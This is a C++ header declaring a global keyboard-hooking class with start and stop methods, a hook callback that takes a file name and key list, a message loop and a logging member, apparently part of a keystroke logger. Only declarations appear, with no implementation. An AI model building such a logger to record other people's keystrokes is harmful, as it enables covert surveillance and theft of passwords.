#pragma once
#include "KeyList.h"
#include "Logging.h"
#include "SpecialKeys.h"

class KeyboardHooking : public Hooking // for global keyboard hooking
{
public:
	KeyboardHooking() {}
	
	void StartKeyboardHooking();
	void StopKeyboardHooking();

	//to be run for hooking the key
	static LRESULT CALLBACK HookProc(int code
						  , WPARAM wParam
						  , LPARAM lParam
						  , std::string file_name
						  , std::map<UINT, UINT>& key_list);

	 //the loop for getting messages
	static void MsgLoop();

private:
	Logging Logger;
	SpecialKeys Key;
};


